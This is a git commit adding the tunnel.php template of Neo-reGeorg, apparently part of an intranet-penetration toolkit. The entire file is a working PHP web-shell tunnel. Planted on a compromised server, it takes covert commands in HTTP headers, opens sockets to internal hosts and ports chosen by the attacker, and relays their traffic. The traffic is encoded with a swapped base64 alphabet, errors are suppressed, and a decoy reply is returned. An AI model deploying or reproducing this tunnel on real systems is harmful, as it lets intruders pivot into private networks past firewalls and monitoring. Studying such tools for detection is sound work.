9f332e218490bfb4e62db53909ae39b49d225909
Al1ex <38161463+Al1ex@users.noreply.github.com>
2021-07-15 15:06:16 +0800

    Add Neo-reGeorg
    Add Neo-reGeorg

---
+++ 内网穿透/ApplicationLayer/Neo-reGeorg-3.4.0/templates/tunnel.php
@@ -0,0 +1,165 @@
+<?php
+ini_set("allow_url_fopen", true);
+ini_set("allow_url_include", true);
+error_reporting(E_ERROR | E_PARSE);
+
+if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
+
+if( !function_exists('apache_request_headers') ) {
+    function apache_request_headers() {
+        $arh = array();
+        $rx_http = '/\AHTTP_/';
+
+        foreach($_SERVER as $key => $val) {
+            if( preg_match($rx_http, $key) ) {
+                $arh_key = preg_replace($rx_http, '', $key);
+                $rx_matches = array();
+                $rx_matches = explode('_', $arh_key);
+                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
+                    foreach($rx_matches as $ak_key => $ak_val) {
+                        $rx_matches[$ak_key] = ucfirst($ak_val);
+                    }
+
+                    $arh_key = implode('-', $rx_matches);
+                }
+                $arh[ucwords(strtolower($arh_key))] = $val;
+            }
+        }
+        return($arh);
+    }
+}
+
+set_time_limit(0);
+$headers=apache_request_headers();
+$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+$de = "BASE64 CHARSLIST";
+
+$cmd = $headers["X-CMD"];
+$mark = substr($cmd,0,22);
+$cmd = substr($cmd, 22);
+$run = "run".$mark;
+$writebuf = "writebuf".$mark;
+$readbuf = "readbuf".$mark;
+
+switch($cmd){
+    case "CONNECT":
+        {
+            $target_ary = explode("|", base64_decode(strtr($headers["X-TARGET"], $de, $en)));
+            $target = $target_ary[0];
+            $port = (int)$target_ary[1];
+            $res = fsockopen($target, $port, $errno, $errstr, 1);
+            if ($res === false)
+            {
+                header('X-STATUS: FAIL');
+                header('X-ERROR: Failed connecting to target');
+                return;
+            }
+
+            stream_set_blocking($res, false);
+            ignore_user_abort();
+
+            @session_start();
+            $_SESSION[$run] = true;
+            $_SESSION[$writebuf] = "";
+            $_SESSION[$readbuf] = "";
+            session_write_close();
+
+            while ($_SESSION[$run])
+            {
+                if (empty($_SESSION[$writebuf])) {
+                    usleep(50000);
+                }
+
+                $readBuff = "";
+                @session_start();
+                $writeBuff = $_SESSION[$writebuf];
+                $_SESSION[$writebuf] = "";
+                session_write_close();
+                if ($writeBuff != "")
+                {
+                    stream_set_blocking($res, false);
+                    $i = fwrite($res, $writeBuff);
+                    if($i === false)
+                    {
+                        @session_start();
+                        $_SESSION[$run] = false;
+                        session_write_close();
+                        return;
+                    }
+                }
+                stream_set_blocking($res, false);
+                while ($o = fgets($res, 10)) {
+                    if($o === false)
+                    {
+                        @session_start();
+                        $_SESSION[$run] = false;
+                        session_write_close();
+                        return;
+                    }
+                    $readBuff .= $o;
+                }
+                if ($readBuff != ""){
+                    @session_start();
+                    $_SESSION[$readbuf] .= $readBuff;
+                    session_write_close();
+                }
+            }
+            fclose($res);
+        }
+        @header_remove('set-cookie');
+        break;
+    case "DISCONNECT":
+        {
+            @session_start();
+            unset($_SESSION[$run]);
+            unset($_SESSION[$readbuf]);
+            unset($_SESSION[$writebuf]);
+            session_write_close();
+        }
+        break;
+    case "READ":
+        {
+            @session_start();
+            $readBuffer = $_SESSION[$readbuf];
+            $_SESSION[$readbuf]="";
+            $running = $_SESSION[$run];
+            session_write_close();
+            if ($running) {
+                header('X-STATUS: OK');
+                header("Connection: Keep-Alive");
+                echo strtr(base64_encode($readBuffer), $en, $de);
+            } else {
+                header('X-STATUS: FAIL');
+            }
+        }
+        break;
+    case "FORWARD": {
+            @session_start();
+            $running = $_SESSION[$run];
+            session_write_close();
+            if(!$running){
+                header('X-STATUS: FAIL');
+                header('X-ERROR: No more running, close now');
+                return;
+            }
+            header('Content-Type: application/octet-stream');
+            $rawPostData = file_get_contents("php://input");
+            if ($rawPostData) {
+                @session_start();
+                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
+                session_write_close();
+                header('X-STATUS: OK');
+                header("Connection: Keep-Alive");
+            } else {
+                header('X-STATUS: FAIL');
+                header('X-ERROR: POST request read filed');
+            }
+        }
+        break;
+    default: {
+        @session_start();
+        session_write_close();
+        exit("Georg says, 'All seems fine'");
+    }
+}
+?>
